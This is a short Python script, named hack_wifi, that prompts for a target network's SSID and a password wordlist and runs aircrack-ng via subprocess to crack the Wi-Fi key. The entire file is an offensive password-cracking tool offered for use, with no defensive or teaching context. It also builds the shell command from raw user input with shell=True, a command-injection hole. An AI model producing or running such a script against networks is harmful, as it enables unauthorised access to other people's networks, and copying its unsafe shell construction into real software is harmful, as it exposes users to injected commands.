import subprocess

def hack_wifi():
    ssid = input("Enter the SSID (name) of the target Wi-Fi network: ")
    password_file = input("Enter the path to a wordlist file containing possible passwords: ")

    # Execute the command to attempt cracking the Wi-Fi password
    cmd = "aircrack-ng -e {} -w {} -l password.txt".format(ssid, password_file)
    subprocess.run(cmd, shell=True)

hack_wifi()
